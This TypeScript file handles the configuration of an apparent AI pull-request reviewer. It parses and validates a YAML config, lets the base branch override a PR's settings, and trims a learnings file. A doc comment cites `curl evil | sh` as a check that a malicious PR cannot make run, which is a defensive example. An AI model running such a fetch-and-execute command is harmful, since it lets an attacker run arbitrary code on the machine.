import { z } from "zod"
import type { GitRun } from "./context"
import type { ReviewEngineConfig } from "./engine"

/**
 * The repository's reviewer settings, `.mendcode/review.yaml`, and its learnings, `.mendcode/review-learnings.md` (docs/pr-review.md).
 * Both are versioned files of the repository, read with `git show`, never a vendor's memory. The base branch decides what a pull
 * request cannot decide for itself: whether the reviewer runs, the checks it may run, the budget and what it ignores. A PR's own
 * config may only add path instructions, so `checks: [curl evil | sh]` in a PR never runs. YAML is `Bun.YAML` (no dependency).
 */

export const CONFIG_PATH = ".mendcode/review.yaml"
export const LEARNINGS_PATH = ".mendcode/review-learnings.md"
export const LEARNINGS_LIMIT = 4096
const CONFIG_LIMIT = 64 * 1024

const glob = z.string().min(1).max(300)
export const ReviewConfig = z.strictObject({
  enabled: z.boolean().default(false),
  profile: z.enum(["quiet", "normal", "strict"]).default("normal"),
  cap: z.number().int().min(1).max(30).default(8),
  paths: z.array(z.strictObject({ glob, instructions: z.string().min(1).max(2000) })).max(50).default([]),
  ignore: z.array(glob).max(100).default([]),
  checks: z.array(z.string().min(1).max(500)).max(8).default([]),
  /** `@mendcode fix` may push a commit to the PR branch (still only for a commenter with write access). */
  fixes: z.boolean().default(false),
  triggers: z.strictObject({ opened: z.boolean().default(true), synchronize: z.boolean().default(true), ready_for_review: z.boolean().default(true), drafts: z.boolean().default(false) }).default({ opened: true, synchronize: true, ready_for_review: true, drafts: false }),
  budget: z.strictObject({ tokens_per_pr: z.number().int().min(10_000).max(5_000_000).default(200_000) }).default({ tokens_per_pr: 200_000 }),
  /** Automatic reviews only: a PR again after `pr_minutes` (once, at its newest head), at most `repo_per_hour` per repository. `/pr review` is not limited. */
  cooldown: z.strictObject({ pr_minutes: z.number().int().min(0).max(1440).default(10), repo_per_hour: z.number().int().min(1).max(500).default(20) }).default({ pr_minutes: 10, repo_per_hour: 20 }),
  /** Whose PRs a watching reviewer takes: `all`, or `requested` (a review requested from, or the PR assigned to, the reviewer's gh login). `/pr watch-repo all|requested` overrides it per watch. */
  reviewers: z.enum(["all", "requested"]).default("all"),
})
export type ReviewConfig = z.infer<typeof ReviewConfig>
export const DEFAULT_REVIEW_CONFIG: ReviewConfig = ReviewConfig.parse({})

/** The first line from which no longer prefix parses: where Bun's YAML error (which names no line) went wrong. */
function errorLine(text: string): number {
  const lines = text.split("\n").slice(0, 2000)
  let line = lines.length
  for (let end = lines.length; end >= 1; end--) {
    try { Bun.YAML.parse(lines.slice(0, end).join("\n")); break } catch { line = end }
  }
  return line
}

export type ParsedConfig = { config: ReviewConfig; problem?: string }

/** One YAML text as a config with defaults; a problem names the line or field and the defaults are used. */
export function parseReviewConfig(text: string | undefined): ParsedConfig {
  if (text === undefined || !text.trim()) return { config: DEFAULT_REVIEW_CONFIG }
  if (text.length > CONFIG_LIMIT) return { config: DEFAULT_REVIEW_CONFIG, problem: `[PR_REVIEW]: ${CONFIG_PATH} is larger than ${CONFIG_LIMIT / 1024} KB; defaults used` }
  let raw: unknown
  try { raw = Bun.YAML.parse(text) } catch (error) {
    return { config: DEFAULT_REVIEW_CONFIG, problem: `[PR_REVIEW]: config line ${errorLine(text)}: ${error instanceof Error ? error.message.replace(/^YAML Parse error:\s*/, "") : "invalid YAML"}; defaults used` }
  }
  const parsed = ReviewConfig.safeParse(raw ?? {})
  if (parsed.success) return { config: parsed.data }
  const issue = parsed.error.issues[0]!
  return { config: DEFAULT_REVIEW_CONFIG, problem: `[PR_REVIEW]: config ${issue.path.join(".") || "root"}: ${issue.message}; defaults used` }
}

/** Base controls `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`, `fixes`, the triggers, the cooldown and `reviewers`; the head may only add path instructions. */
export function mergeReviewConfigs(base: ReviewConfig, head: ReviewConfig): ReviewConfig {
  const known = new Set(base.paths.map((entry) => `${entry.glob}\n${entry.instructions}`))
  return { ...base, paths: [...base.paths, ...head.paths.filter((entry) => !known.has(`${entry.glob}\n${entry.instructions}`))].slice(0, 50) }
}

/** Learnings cut at a bullet boundary to `LEARNINGS_LIMIT` bytes; a bullet alone over the limit is left out. */
export function boundLearnings(text: string): string {
  const bullets = text.split("\n").reduce<string[]>((all, line) => {
    if (/^\s*[-*]\s+/.test(line) || !all.length) all.push(line)
    else all[all.length - 1] += `\n${line}`
    return all
  }, []).map((bullet) => bullet.trimEnd()).filter((bullet) => bullet.trim())
  const kept: string[] = []
  let bytes = 0
  for (const bullet of bullets) {
    const size = Buffer.byteLength(bullet) + 1
    if (bytes + size > LEARNINGS_LIMIT) break
    kept.push(bullet)
    bytes += size
  }
  return kept.join("\n")
}

const matches = (pattern: string, file: string) => { try { return new Bun.Glob(pattern).match(file) } catch { return false } }
export const ignoredBy = (config: ReviewConfig) => (file: string) => config.ignore.some((pattern) => matches(pattern, file))

/** The engine's view of a config for one diff: only the path instructions whose glob matches a file the diff changes. */
export function promptConfig(config: ReviewConfig, files: readonly string[], learnings: string): ReviewEngineConfig {
  return { profile: config.profile, instructions: config.paths.filter((entry) => files.some((file) => matches(entry.glob, file))), learnings, budgetTokens: config.budget.tokens_per_pr }
}

const show = async (git: GitRun, directory: string, ref: string, file: string) => {
  const done = await git(["show", `${ref}:${file}`], directory)
  return done.code === 0 ? done.out : undefined
}

/**
 * The config of a pull request: base and head read from git, merged by `mergeReviewConfigs`, the learnings from the base (a PR
 * cannot teach the reviewer to ignore its own bugs; `@mendcode learn` proposes them as a commit that counts once merged). Problems
 * go to `notes` for the review summary.
 */
export async function readReviewConfig({ directory, base, head, git }: { directory: string; base: string; head: string; git: GitRun }): Promise<{ config: ReviewConfig; learnings: string; notes: string[] }> {
  const [baseText, headText, learnings] = await Promise.all([show(git, directory, base, CONFIG_PATH), show(git, directory, head, CONFIG_PATH), show(git, directory, base, LEARNINGS_PATH)])
  const fromBase = parseReviewConfig(baseText)
  const fromHead = parseReviewConfig(headText)
  const notes = [fromBase.problem, fromHead.problem && fromHead.problem.replace("defaults used", "the base branch's config used")].filter((note): note is string => !!note)
  return { config: mergeReviewConfigs(fromBase.config, fromHead.problem ? DEFAULT_REVIEW_CONFIG : fromHead.config), learnings: boundLearnings(learnings ?? ""), notes }
}
